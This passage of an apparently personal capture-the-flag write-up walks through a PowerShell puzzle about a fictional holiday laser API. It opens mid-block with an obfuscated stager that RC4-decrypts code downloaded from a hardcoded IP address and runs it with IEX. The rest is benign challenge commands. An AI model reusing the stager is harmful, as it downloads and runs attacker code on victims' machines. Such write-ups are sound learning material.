</span></span><span style=display:flex><span><span style=color:#268bd2>$WC</span>.PRoXy.CREDenTIAls = [<span style=color:#cb4b16>SySTEm.NET.CRedeNTiAlCAcHe</span>]::DeFaulTNeTwORkCREDenTiALS;
</span></span><span style=display:flex><span><span style=color:#268bd2>$Script:Proxy</span> = <span style=color:#268bd2>$wc</span>.Proxy;
</span></span><span style=display:flex><span><span style=color:#268bd2>$K</span> = [<span style=color:#cb4b16>SySTEM.Text.EncOdING</span>]::ASCII.GeTBYteS(<span style=color:#2aa198>&#39;zd!Pmw3J/qnuWoHX~=g.{&gt;p,GE]:|#MR&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#268bd2>$R</span> = {
</span></span><span style=display:flex><span>    <span style=color:#268bd2>$D</span>, <span style=color:#268bd2>$K</span> = <span style=color:#268bd2>$ARGs</span>;
</span></span><span style=display:flex><span>    <span style=color:#268bd2>$S</span> = <span style=color:#2aa198>0</span>.<span style=color:#2aa198>.255</span>;
</span></span><span style=display:flex><span>    <span style=color:#2aa198>0</span>.<span style=color:#2aa198>.255</span>|% {
</span></span><span style=display:flex><span>        <span style=color:#268bd2>$J</span> = (<span style=color:#268bd2>$J</span> + <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$_</span>] + <span style=color:#268bd2>$K</span>[<span style=color:#268bd2>$_</span>%<span style=color:#268bd2>$K</span>.COUnt])<span style=color:#719e07>%</span><span style=color:#2aa198>256</span>;
</span></span><span style=display:flex><span>        <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$_</span>], <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$J</span>] = <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$J</span>], <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$_</span>]
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>    <span style=color:#268bd2>$D</span>|% {
</span></span><span style=display:flex><span>        <span style=color:#268bd2>$I</span> = (<span style=color:#268bd2>$I</span> + <span style=color:#2aa198>1</span>)<span style=color:#719e07>%</span><span style=color:#2aa198>256</span>;
</span></span><span style=display:flex><span>        <span style=color:#268bd2>$H</span> = (<span style=color:#268bd2>$H</span> + <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$I</span>])<span style=color:#719e07>%</span><span style=color:#2aa198>256</span>;
</span></span><span style=display:flex><span>        <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$I</span>], <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$H</span>] = <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$H</span>], <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$I</span>];
</span></span><span style=display:flex><span>        <span style=color:#268bd2>$_</span> <span style=color:#719e07>-BXoR</span><span style=color:#268bd2>$S</span>[(<span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$I</span>] + <span style=color:#268bd2>$S</span>[<span style=color:#268bd2>$H</span>])<span style=color:#719e07>%</span><span style=color:#2aa198>256</span>] <span style=color:#586e75># change it to -BXoR</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span><span style=color:#268bd2>$ser</span> = <span style=color:#2aa198>&#39;http://144.202.46.214:8080&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#268bd2>$t</span> = <span style=color:#2aa198>&#39;/admin/get.php&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#268bd2>$WC</span>.HEADErs.Add(<span style=color:#2aa198>&#34;Cookie&#34;</span>, <span style=color:#2aa198>&#34;session=reT9XQAl0EMJnxukEZy/7MS70X4=&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#268bd2>$DATa</span> = <span style=color:#268bd2>$WC</span>.DownlOADDAtA(<span style=color:#268bd2>$sEr</span> + <span style=color:#268bd2>$T</span>);
</span></span><span style=display:flex><span><span style=color:#268bd2>$Iv</span> = <span style=color:#268bd2>$DatA</span>[<span style=color:#2aa198>0</span>.<span style=color:#2aa198>.3</span>];
</span></span><span style=display:flex><span><span style=color:#268bd2>$DatA</span> = <span style=color:#268bd2>$dATa</span>[<span style=color:#2aa198>4</span>..<span style=color:#268bd2>$DatA</span>.lENGtH];
</span></span><span style=display:flex><span> -JOIN[<span style=color:#cb4b16>ChaR[]</span>](&amp; <span style=color:#268bd2>$R</span> <span style=color:#268bd2>$DatA</span> (<span style=color:#268bd2>$IV</span> + <span style=color:#268bd2>$K</span>))|<span style=color:#b58900>IEX
</span></span></span></code></pre></div><h1 id=xmas-cheer-laser---sparkle-redberry>Xmas Cheer Laser - Sparkle Redberry
<a class=header-link href=#xmas-cheer-laser---sparkle-redberry><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>What is at <code>/home/callingcard.txt.</code>?</p><pre tabindex=0><code>PS /home/elf&gt; gc ../callingcard.txt
What&#39;s become of your dear laser?
Fa la la la la, la la la la
Seems you can&#39;t now seem to raise her!
Fa la la la la, la la la la
Could commands hold riddles in hist&#39;ry?
Fa la la la la, la la la la
Nay! You&#39;ll ever suffer myst&#39;ry!
Fa la la la la, la la la la
</code></pre><p>What is at <code>localhost:1225</code>?</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>PS /home/elf&gt; (Invoke-WebRequest -Uri http://localhost:1225/).RawContent
</span></span><span style=display:flex><span>HTTP/1.1 200 OK                                                                           
</span></span><span style=display:flex><span>Server: Microsoft-NetCore/2.0                                                             
</span></span><span style=display:flex><span>Date: Thu, 12 Dec 2019 08:10:51 GMT                                                       
</span></span><span style=display:flex><span>Content-Length: 860                                                                       
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;<span style=color:#268bd2>html</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#268bd2>body</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#268bd2>pre</span>&gt;
</span></span><span style=display:flex><span>----------------------------------------------------
</span></span><span style=display:flex><span>Christmas Cheer Laser Project Web API
</span></span><span style=display:flex><span>----------------------------------------------------
</span></span><span style=display:flex><span>Turn the laser on/off:
</span></span><span style=display:flex><span>GET http://localhost:1225/api/on
</span></span><span style=display:flex><span>GET http://localhost:1225/api/off
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Check the current Mega-Jollies of laser output
</span></span><span style=display:flex><span>GET http://localhost:1225/api/output
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Change the lense refraction value (1.0 - 2.0):
</span></span><span style=display:flex><span>GET http://localhost:1225/api/refraction?val=1.0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Change laser temperature in degrees Celsius:
</span></span><span style=display:flex><span>GET http://localhost:1225/api/temperature?val=-10
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Change the mirror angle value (0 - 359):
</span></span><span style=display:flex><span>GET http://localhost:1225/api/angle?val=45.1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Change gaseous elements mixture:
</span></span><span style=display:flex><span>POST http://localhost:1225/api/gas
</span></span><span style=display:flex><span>POST BODY EXAMPLE (gas mixture percentages):
</span></span><span style=display:flex><span>O=5&amp;H=5&amp;He=5&amp;N=5&amp;Ne=20&amp;Ar=10&amp;Xe=10&amp;F=20&amp;Kr=10&amp;Rn=10
</span></span><span style=display:flex><span>----------------------------------------------------
</span></span><span style=display:flex><span>&lt;/<span style=color:#268bd2>pre</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#268bd2>body</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#268bd2>html</span>&gt;
</span></span></code></pre></div><p>We can turn it on:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf&gt; (<span style=color:#b58900>Invoke-WebRequest</span> -Uri http://localhost:<span style=color:#2aa198>1225</span>/api/on).RawContent
</span></span><span style=display:flex><span>HTTP/<span style=color:#2aa198>1.1</span> <span style=color:#2aa198>200</span> OK                                                                           
</span></span><span style=display:flex><span>Server: <span style=color:#b58900>Microsoft-NetCore</span>/<span style=color:#2aa198>2.0</span>                                                             
</span></span><span style=display:flex><span>Date: Thu, <span style=color:#2aa198>12</span> Dec <span style=color:#2aa198>2019</span> <span style=color:#2aa198>08</span>:<span style=color:#2aa198>12</span>:<span style=color:#2aa198>39</span> GMT                                                       
</span></span><span style=display:flex><span><span style=color:#b58900>Content-Length</span>: <span style=color:#2aa198>32</span>                                                                        
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Christmas Cheer Laser Powered On
</span></span></code></pre></div><p>Then we can query the output. It seems like it's just random.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>(<span style=color:#b58900>Invoke-WebRequest</span> -Uri http://localhost:<span style=color:#2aa198>1225</span>/api/gas -Method POST
</span></span><span style=display:flex><span>    -Body <span style=color:#2aa198>&#34;O=5&amp;H=5&amp;He=5&amp;N=5&amp;Ne=20&amp;Ar=10&amp;Xe=10&amp;F=20&amp;Kr=10&amp;Rn=10&#34;</span>).RawContent
</span></span></code></pre></div><p><code>Could commands hold riddles in hist'ry?</code>? See PowerShell history?</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf&gt; <span style=color:#b58900>Get-History</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  Id CommandLine
</span></span><span style=display:flex><span>  -- -----------
</span></span><span style=display:flex><span>   <span style=color:#2aa198>1</span> <span style=color:#b58900>Get-Help</span> -Name <span style=color:#b58900>Get-Process</span> 
</span></span><span style=display:flex><span>   <span style=color:#2aa198>2</span> <span style=color:#b58900>Get-Help</span> -Name Get-* 
</span></span><span style=display:flex><span>   <span style=color:#2aa198>3</span> <span style=color:#b58900>Set-ExecutionPolicy</span> Unrestricted 
</span></span><span style=display:flex><span>   <span style=color:#2aa198>4</span> <span style=color:#b58900>Get-Service</span> | <span style=color:#b58900>ConvertTo-HTML</span> -Property Name, Status &gt; C:\services.htm 
</span></span><span style=display:flex><span>   <span style=color:#2aa198>5</span> <span style=color:#b58900>Get-Service</span> | <span style=color:#b58900>Export-CSV</span> c:\service.csv 
</span></span><span style=display:flex><span>   <span style=color:#2aa198>6</span> <span style=color:#b58900>Get-Service</span> | <span style=color:#b58900>Select-Object</span> Name, Status | <span style=color:#b58900>Export-CSV</span> c:\service.csv 
</span></span><span style=display:flex><span>   <span style=color:#2aa198>7</span> (<span style=color:#b58900>Invoke-WebRequest</span> http://<span style=color:#2aa198>127.0</span>.0.<span style=color:#2aa198>1</span>:<span style=color:#2aa198>1225</span>/api/angle<span style=color:#719e07>?</span>val=<span style=color:#2aa198>65.5</span>).RawContent
</span></span><span style=display:flex><span>   <span style=color:#2aa198>8</span> <span style=color:#b58900>Get-EventLog</span> -Log <span style=color:#2aa198>&#34;Application&#34;</span> 
</span></span><span style=display:flex><span>   <span style=color:#2aa198>9</span> I have many name=value variables that I share to applications system wide. At a com…
</span></span></code></pre></div><p>But that does not show us everything, we are only looking for commands that do <code>Invoke</code>:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf&gt; <span style=color:#b58900>Get-History</span> | <span style=color:#b58900>Where-Object</span> {<span style=color:#268bd2>$_</span>.CommandLine <span style=color:#719e07>-like</span> <span style=color:#2aa198>&#34;*Invoke*&#34;</span>} 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  Id CommandLine
</span></span><span style=display:flex><span>  -- -----------
</span></span><span style=display:flex><span>   <span style=color:#2aa198>7</span> (<span style=color:#b58900>Invoke-WebRequest</span> http://<span style=color:#2aa198>127.0</span>.0.<span style=color:#2aa198>1</span>:<span style=color:#2aa198>1225</span>/api/angle<span style=color:#719e07>?</span>val=<span style=color:#2aa198>65.5</span>).RawContent
</span></span><span style=display:flex><span>  <span style=color:#2aa198>11</span> (<span style=color:#b58900>Invoke-WebRequest</span> -Uri http://localhost:<span style=color:#2aa198>1225</span>/api/on).RawContent
</span></span><span style=display:flex><span>  <span style=color:#2aa198>12</span> (<span style=color:#b58900>Invoke-WebRequest</span> http://<span style=color:#2aa198>127.0</span>.0.<span style=color:#2aa198>1</span>:<span style=color:#2aa198>1225</span>/api/angle<span style=color:#719e07>?</span>val=<span style=color:#2aa198>65.5</span>).RawContent
</span></span><span style=display:flex><span>  <span style=color:#2aa198>13</span> (<span style=color:#b58900>Invoke-WebRequest</span> http://<span style=color:#2aa198>127.0</span>.0.<span style=color:#2aa198>1</span>:<span style=color:#2aa198>1225</span>/api/output).RawContent
</span></span></code></pre></div><p><strong><code>http://127.0.0.1:1225/api/angle?val=65.5</code></strong></p><p>Did not work, let's leave, return and get everything.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf&gt; <span style=color:#b58900>Get-History</span> | <span style=color:#b58900>Format-List</span> -Property *
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75># removed</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Id                 : <span style=color:#2aa198>7</span>
</span></span><span style=display:flex><span>CommandLine        : (<span style=color:#b58900>Invoke-WebRequest</span> 
</span></span><span style=display:flex><span>                     http://<span style=color:#2aa198>127.0</span>.0.<span style=color:#2aa198>1</span>:<span style=color:#2aa198>1225</span>/api/angle<span style=color:#719e07>?</span>val=<span style=color:#2aa198>65.5</span>).RawContent
</span></span><span style=display:flex><span>ExecutionStatus    : Completed
</span></span><span style=display:flex><span>StartExecutionTime : <span style=color:#2aa198>11</span>/<span style=color:#2aa198>29</span>/<span style=color:#2aa198>19</span> <span style=color:#2aa198>4</span>:<span style=color:#2aa198>56</span>:<span style=color:#2aa198>44</span> PM
</span></span><span style=display:flex><span>EndExecutionTime   : <span style=color:#2aa198>11</span>/<span style=color:#2aa198>29</span>/<span style=color:#2aa198>19</span> <span style=color:#2aa198>4</span>:<span style=color:#2aa198>56</span>:<span style=color:#2aa198>44</span> PM
</span></span><span style=display:flex><span>Duration           : <span style=color:#2aa198>00</span>:<span style=color:#2aa198>00</span>:<span style=color:#2aa198>00.0310799</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75># removed</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Id                 : <span style=color:#2aa198>9</span>
</span></span><span style=display:flex><span>CommandLine        : I have many name=value variables that I share to applications 
</span></span><span style=display:flex><span>                     system wide. At a command I will reveal my secrets once you Get my 
</span></span><span style=display:flex><span>                     Child Items.
</span></span><span style=display:flex><span>ExecutionStatus    : Completed
</span></span><span style=display:flex><span>StartExecutionTime : <span style=color:#2aa198>11</span>/<span style=color:#2aa198>29</span>/<span style=color:#2aa198>19</span> <span style=color:#2aa198>4</span>:<span style=color:#2aa198>57</span>:<span style=color:#2aa198>16</span> PM
</span></span><span style=display:flex><span>EndExecutionTime   : <span style=color:#2aa198>11</span>/<span style=color:#2aa198>29</span>/<span style=color:#2aa198>19</span> <span style=color:#2aa198>4</span>:<span style=color:#2aa198>57</span>:<span style=color:#2aa198>16</span> PM
</span></span><span style=display:flex><span>Duration           : <span style=color:#2aa198>00</span>:<span style=color:#2aa198>00</span>:<span style=color:#2aa198>00.6090308</span>
</span></span></code></pre></div><p>Number 9 points to environmental variables.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf&gt; <span style=color:#b58900>gci </span>env:* | <span style=color:#b58900>sort-object</span> name
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Name                           Value
</span></span><span style=display:flex><span>----                           -----
</span></span><span style=display:flex><span>_                              /root/CheerLaserService
</span></span><span style=display:flex><span>DOTNET_SYSTEM_GLOBALIZATION_I… false
</span></span><span style=display:flex><span>HOME                           /home/elf
</span></span><span style=display:flex><span>HOSTNAME                       b011d5af8027
</span></span><span style=display:flex><span>LANG                           en_US.UTF-<span style=color:#2aa198>8</span>
</span></span><span style=display:flex><span>LC_ALL                         en_US.UTF-<span style=color:#2aa198>8</span>
</span></span><span style=display:flex><span>LOGNAME                        elf
</span></span><span style=display:flex><span>MAIL                           /var/mail/elf
</span></span><span style=display:flex><span>PATH                           /opt/microsoft/powershell/<span style=color:#2aa198>6</span>:/usr/local/sbin:/usr/local/bi…
</span></span><span style=display:flex><span>PSModuleAnalysisCachePath      /var/cache/microsoft/powershell/PSModuleAnalysisCache/Mod…
</span></span><span style=display:flex><span>PSModulePath                   /home/elf/.local/share/powershell/Modules:/root/.local/sh…
</span></span><span style=display:flex><span><span style=color:#b58900>PWD </span>                           /home/elf
</span></span><span style=display:flex><span>RESOURCE_ID                    373f8b8e-<span style=color:#2aa198>9767</span>-4f99-866c-6b7bbc879102
</span></span><span style=display:flex><span>riddle                         Squeezed and compressed I am hidden away. Expand me from …
</span></span><span style=display:flex><span>SHELL                          /home/elf/elf
</span></span><span style=display:flex><span>SHLVL                          <span style=color:#2aa198>1</span>
</span></span><span style=display:flex><span>TERM                           xterm
</span></span><span style=display:flex><span>USER                           elf
</span></span><span style=display:flex><span>userdomain                     laserterminal
</span></span><span style=display:flex><span>USERDOMAIN                     laserterminal
</span></span><span style=display:flex><span>username                       elf
</span></span><span style=display:flex><span>USERNAME                       elf
</span></span></code></pre></div><p>We need to expand the <code>riddle</code> variable:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf&gt; <span style=color:#b58900>gci </span>env:riddle | <span style=color:#b58900>Format-list</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Name  : riddle
</span></span><span style=display:flex><span>Value : Squeezed and compressed I am hidden away. Expand me from my prison and I will 
</span></span><span style=display:flex><span>        show you the way. Recurse through all /etc and <span style=color:#b58900>Sort </span>on my LastWriteTime to 
</span></span><span style=display:flex><span>        reveal im the newest of all.
</span></span></code></pre></div><p>Apparently it's <code>archive</code>:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf&gt; <span style=color:#b58900>gci </span>-Path ../../etc/ -Recurse | <span style=color:#b58900>sort </span>LastWriteTime | <span style=color:#b58900>select </span>-last <span style=color:#2aa198>1</span>
</span></span><span style=display:flex><span><span style=color:#b58900>gci </span>: Access to the path <span style=color:#2aa198>&#39;/etc/ssl/private&#39;</span> is denied.
</span></span><span style=display:flex><span>At line:<span style=color:#2aa198>1</span> char:<span style=color:#2aa198>1</span>
</span></span><span style=display:flex><span>+ <span style=color:#b58900>gci </span>-Path ../../etc/ -Recurse | <span style=color:#b58900>sort </span>LastWriteTime | <span style=color:#b58900>select </span>-last <span style=color:#2aa198>1</span> | ...
</span></span><span style=display:flex><span>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span></span><span style=display:flex><span>+ CategoryInfo          : PermissionDenied: (/etc/ssl/private:String) [<span style=color:#b58900>Get-ChildItem</span>], UnauthorizedAccessException
</span></span><span style=display:flex><span>+ FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Directory: /etc/apt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name
</span></span><span style=display:flex><span>----                -------------         ------ ----
</span></span><span style=display:flex><span>--r---          <span style=color:#2aa198>12</span>/<span style=color:#2aa198>12</span>/<span style=color:#2aa198>19</span>  <span style=color:#2aa198>8</span>:<span style=color:#2aa198>41</span> AM        <span style=color:#2aa198>5662902</span> archive
</span></span></code></pre></div><p>Let's see what kind of file it is. It looks too big to be a text file.</p><p>We can run <code>Get-Content -TotalCount n</code> on it to the get the first <code>n</code> lines.
Seems like it's a zip file.</p><pre tabindex=0><code>PS /etc/apt&gt; Expand-Archive -LiteralPath ./archive -DestinationPath /home/elf/
</code></pre><p>Now we have a directory named <code>refraction</code> inside <code>/home/elf</code>.</p><pre tabindex=0><code>PS /home/elf/refraction&gt; dir
    Directory: /home/elf/refraction

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------           11/7/19 11:57 AM            134 riddle
------           11/5/19  2:26 PM        5724384 runme.elf

PS /home/elf/refraction&gt; gc ./riddle
Very shallow am I in the depths of your elf home. You can find my entity by
    using my md5 identity:

25520151A320B5B0D21561F92C8F6224
</code></pre><p>Googling for the MD5 finds nothing, might be the key for something inside <code>runme.elf</code>?</p><pre tabindex=0><code>PS /home/elf/refraction&gt; chmod +x ./runme.elf
PS /home/elf/refraction&gt; ./runme.elf
refraction?val=1.867
</code></pre><p>Another part of the answer: <strong><code>refraction?val=1.867</code></strong></p><p>Now to get the next step</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>Get-ChildItem</span> -recurse | <span style=color:#b58900>Select-String</span> -pattern <span style=color:#2aa198>&#34;25520151A320B5B0D21561F92C8F6224&#34;</span>
</span></span><span style=display:flex><span>    | <span style=color:#b58900>group </span>path | <span style=color:#b58900>select </span>name
</span></span></code></pre></div><p>Maybe we have to run Get-FileHash on the files inside <code>depth</code> (and not in
subdirectories) and see which one has what we want. Did not work, it might be in
one of the directories. Doing <code>Select-String</code> on the output did not work.</p><p><code>Get-FileHash</code> returns an object and we can see its values.</p><pre tabindex=0><code>PS /home/elf/depths&gt; gci ./rujaagk0.txt | Get-FileHash -Algorithm MD5 | Get-Member

   TypeName: Microsoft.PowerShell.Commands.FileHashInfo
Name        MemberType Definition
----        ---------- ----------
Equals      Method     bool Equals(System.Object obj)
GetHashCode Method     int GetHashCode()
GetType     Method     type GetType()
ToString    Method     string ToString()
Algorithm   Property   string Algorithm {get;set;}
Hash        Property   string Hash {get;set;}
Path        Property   string Path {get;set;}
</code></pre><p>We can get specific fields with <code>Select-Object Path,Hash</code>.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf/depths&gt; <span style=color:#b58900>gci </span>-Recurse *.txt | <span style=color:#b58900>Get-FileHash</span> -Algorithm MD5 |
</span></span><span style=display:flex><span>    <span style=color:#b58900>Select-Object</span> Path,Hash | <span style=color:#b58900>Select-String</span> -Pattern <span style=color:#2aa198>&#34;25520151A320B5B0D21561F92C8F6224&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#268bd2>@</span>{Path=/home/elf/depths/produce/thhy5hll.txt; Hash=25520151A320B5B0D21561F92C8F6224}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf/depths&gt; <span style=color:#b58900>gc </span>./produce/thhy5hll.txt
</span></span><span style=display:flex><span>temperature<span style=color:#719e07>?</span>val=<span style=color:#2aa198>-33.5</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>I am one of many thousand similar txt<span style=color:#2aa198>&#39;s contained within the deepest of
</span></span></span><span style=display:flex><span><span style=color:#2aa198>/home/elf/depths. Finding me will give you the most strength but doing so
</span></span></span><span style=display:flex><span><span style=color:#2aa198>will require Piping all the FullName&#39;</span>s to <span style=color:#b58900>Sort </span>Length.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf/depths&gt; <span style=color:#b58900>dir </span>*.txt -Recurse | <span style=color:#b58900>Select-String</span> -Pattern <span style=color:#2aa198>&#34;temperature\?val&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>produce/thhy5hll.txt:<span style=color:#2aa198>1</span>:temperature<span style=color:#719e07>?</span>val=<span style=color:#2aa198>-33.5</span>
</span></span></code></pre></div><p>Another part of the answer: <strong><code>temperature?val=-33.5</code></strong>.</p><p>Not so lucky with <code>dir *.txt -Recurse | Select-String -Pattern "refraction\?val"</code>.</p><p>Does it mean we have get all file names, sort by length and see what happens? Yes.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>gc </span>(<span style=color:#b58900>gci </span>*.txt -Recurse | <span style=color:#b58900>sort </span>{ <span style=color:#268bd2>$_</span>.FullName.length } | <span style=color:#b58900>Select-Object</span> -Last <span style=color:#2aa198>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Get <span style=color:#719e07>process</span> information to include Username identification. Stop <span style=color:#719e07>Process</span> to show me you&#39;re skilled and <span style=color:#719e07>in</span> this order they must be killed:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>bushy
</span></span><span style=display:flex><span>alabaster
</span></span><span style=display:flex><span>minty
</span></span><span style=display:flex><span>holly
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#719e07>Do</span> this <span style=color:#719e07>for</span> me and then you /shall/see .
</span></span></code></pre></div><p>It's the file below:</p><pre tabindex=0><code>PS /home/elf/depths&gt; gc
/home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown
/escape/vote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever
/practical/therefore/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful
/dawn/adult/either/burn/end/accurate/rubbed/cake/main/she/threw/eager/trip/to
/soon/think/fall/is/greatest/become/accident/labor/sail/dropped/fox/0jhj5xz6.txt
</code></pre><pre tabindex=0><code>PS /home/elf&gt; Get-Process -IncludeUserName

     WS(M)   CPU(s)      Id UserName                       ProcessName
     -----   ------      -- --------                       -----------
    108.68     2.27       7 root                           CheerLaserServi
    109.38     3.36      56 elf                            elf
      3.40     0.06       1 root                           init
      3.52     1.40       6 root                           Processes
     97.12     1.81      38 root                           pwsh
      0.74     0.00      10 alabaster                      sleep
      0.76     0.00      27 bushy                          sleep
      0.74     0.00      34 minty                          sleep
      0.82     0.00      37 holly                          sleep
      3.50     0.00      55 root                           su
      3.88     0.00       8 root                           sudo
      3.84     0.00      25 root                           sudo
      3.83     0.00      32 root                           sudo
      3.90     0.00      35 root                           sudo

PS /home/elf&gt; Stop-Process -ID 30 -Force
PS /home/elf&gt; Stop-Process -ID 10 -Force
PS /home/elf&gt; Stop-Process -ID 53 -Force
PS /home/elf&gt; Stop-Process -ID 72 -Force

/usr/bin/Processes: line 59:     8 Killed   /usr/bin/sudo -u alabaster /bin/bash -c &#34;/bin/sleep 999999&#34;
/usr/bin/Processes: line 59:    28 Killed   /usr/bin/sudo -u bushy /bin/bash -c &#34;/bin/sleep 999999&#34;
/usr/bin/Processes: line 59:    50 Killed   /usr/bin/sudo -u minty /bin/bash -c &#34;/bin/sleep 999999&#34;
/usr/bin/Processes: line 59:    69 Killed   /usr/bin/sudo -u holly /bin/bash -c &#34;/bin/sleep 999999&#34;
PS /home/elf&gt; Get-Content /shall/see
Get the .xml children of /etc - an event log to be found. Group all .Id&#39;s and
the last thing will be in the Properties of the lonely unique event Id.
</code></pre><pre tabindex=0><code>PS /etc&gt; gci *.xml -Recurse
gci : Access to the path &#39;/etc/ssl/private&#39; is denied.
At line:1 char:1
+ gci *.xml -Recurse
+ ~~~~~~~~~~~~~~~~~~
+ CategoryInfo          : PermissionDenied: (/etc/ssl/private:String) [Get-ChildItem], UnauthorizedAccessException
+ FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

    Directory: /etc/systemd/system/timers.target.wants

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
--r---          11/18/19  7:53 PM       10006962 EventLog.xml
</code></pre><p>Let's follow this:</p><ul><li><a href=https://isc.sans.edu/forums/diary/Parsing+Windows+Eventlogs+in+Powershell/15298/ target=_blank rel="noreferrer noopener">https://isc.sans.edu/forums/diary/Parsing+Windows+Eventlogs+in+Powershell/15298/</a></li></ul><pre tabindex=0><code>PS /&gt; $mylog = Import-Clixml /etc/systemd/system/timers.target.wants/EventLog.xml
PS /&gt; $mylog | group Id                         

Count Name      Group
----- ----      -----
